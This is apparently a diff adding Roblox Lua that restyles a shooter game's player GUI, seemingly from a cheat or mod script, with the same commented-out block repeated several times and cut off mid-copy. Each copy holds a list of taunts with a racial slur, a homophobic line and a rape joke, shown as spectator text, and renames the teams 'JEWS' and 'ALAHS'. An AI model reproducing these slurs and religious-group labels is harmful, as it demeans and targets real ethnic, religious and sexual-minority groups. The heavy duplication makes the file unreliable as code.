+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham
+
+	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
+ 
+
+
+
+
+--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 
+
+
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8
+
+	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8
+
